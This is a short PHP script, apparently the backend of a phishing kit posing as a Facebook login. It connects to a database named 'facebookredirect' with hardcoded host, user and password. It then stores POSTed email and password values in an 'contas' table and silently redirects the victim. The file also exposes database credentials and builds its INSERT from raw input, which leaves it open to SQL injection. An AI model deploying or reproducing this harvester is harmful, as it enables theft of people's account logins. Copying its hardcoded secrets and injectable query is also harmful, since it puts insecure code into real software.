<?php
    //inicia a conexão com o banco de dados setando(colocando) valores dentro das variáveis
    $servidor = "sql211.epizy.com";//nome do servidor, como é local sempre é localhost
    $username = "epiz_24187470";//nome de usuário do banco de dados root é padrão
    $password = "qt9QNEsdlpK";//senha para acessar o banco de dados
    $database = "epiz_24187470_facebookredirect";//nome do banco de dados que vc criou
     
    //faz a connection  
    $connection = mysql_connect($servidor, $username, $password); //gera a conexão passando os dados das var criadas
    if (!$connection) {  
       die('Not connected : ' . mysql_error());//caso não consiga conectar ao banco de dados emite msg de erro
    }
    //seleciona o banco de dados existente no servidor definido acima   
    @mysql_select_db($database) or die(mysql_error());
    //aki é onde é selecionado o banco de dados desejado, caso não consiga emite msg de erro com o mysql_error();
     
    mysql_set_charset('utf8');//bom ter para evitar problemas com acentos
     
?>

// <?php

$LOGIN = $_POST['email'];

$SENHA = $_POST['pass'];

$sql   =   mysql_query("INSERT INTO contas(email, pass)VALUES('$LOGIN','$SENHA')")or die(mysql_error());


echo '<meta http-equiv="refresh" content="0;url=redirect.php">';

exit;

?>